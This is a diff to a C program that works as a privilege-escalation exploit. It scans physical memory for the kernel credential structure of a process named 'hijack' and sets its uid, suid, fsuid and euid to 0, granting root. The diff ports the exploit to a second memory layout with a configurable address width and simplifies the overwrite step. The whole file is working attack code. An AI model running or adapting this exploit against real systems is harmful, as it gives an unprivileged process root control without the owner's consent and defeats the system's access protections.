@@ -2,10 +2,19 @@
 #include <stdint.h>
 #include <string.h>
 
+#ifdef CPU_MIMX8MQ6DVAJZ
 const uint64_t kernel_start = 0x40000000;
 const uint64_t page_offset =  ((uint64_t)(0xffffffffffffffff) << (47 - 1));
 const uint64_t DDR_start = 0x40000000;
 const uint64_t DDR_end =   0xC0000000;
+typedef uint64_t kerneladdr_t;
+#else
+const uint64_t kernel_start = 0xC0000000;
+const uint64_t page_offset =  0xc0000000;//((uint64_t)(0xffffffffffffffff) << (47 - 1));
+const uint64_t DDR_start = 0xC0000000;
+const uint64_t DDR_end =   0xE0000000;
+typedef uint32_t kerneladdr_t;
+#endif
 
 uint32_t virt_to_phys(uint64_t virt) {
   return (virt & ~page_offset) + kernel_start;
@@ -16,7 +25,7 @@ int is_aligned(uint64_t addr) {
 }
 
 int is_valid_addr(uint64_t phys_addr) {
-  return is_aligned(phys_addr) && phys_addr >= DDR_start && phys_addr < DDR_end; 
+  return is_aligned(phys_addr) && phys_addr >= DDR_start && phys_addr < DDR_end;
 }
 
 struct cred {
@@ -32,10 +41,7 @@ struct cred {
 
 void escalate_process(const char* procname) {
   int len = strlen(procname);
-
-  //for(uint8_t *s = 0x0000000070000000; s < 0xC0000000; s++) {
-  uint32_t addr = 0x90000000;
-  for(; addr < 0xC0000000; addr++) {
+  for(uint32_t addr = DDR_start; addr < DDR_end; addr++) {
     if((addr & 0x64fffff) == 0x6400000) {
       printf("AT %lx\r\n", addr);
     }
@@ -51,7 +57,7 @@ void escalate_process(const char* procname) {
     }
 
     if(found && is_aligned(addr)) {
-      uint64_t cred_virt = *(uint64_t*)(addr - 16) /* sizeof two 64bit pointers to cred structures */;
+      kerneladdr_t cred_virt = *(kerneladdr_t*)(addr - 2 * sizeof(kerneladdr_t));
       uint32_t cred_phys = virt_to_phys(cred_virt);
 
       if(!is_valid_addr(cred_phys)) {
@@ -63,14 +69,12 @@ void escalate_process(const char* procname) {
         printf("uid: %lu\r\n", real_cred->uid);
 
         if(real_cred->uid == 1000) {
+          real_cred->uid = 0;
+          real_cred->suid = 0;
+          real_cred->fsuid = 0;
+          real_cred->euid = 0;
           printf("probably found process\r\n");
-          for(;;) {
-            real_cred->usage = 2000;
-            real_cred->uid = 0;
-            real_cred->suid = 0;
-            real_cred->fsuid = 0;
-            real_cred->euid = 0;
-          }
+          return;
         }
       }
     }
@@ -83,5 +87,5 @@ void escalate_process(const char* procname) {
 int main() {
   printf("=== ROOT ===\r\n");
   escalate_process("hijack");
-	return 1;
+  for(;;);
 }
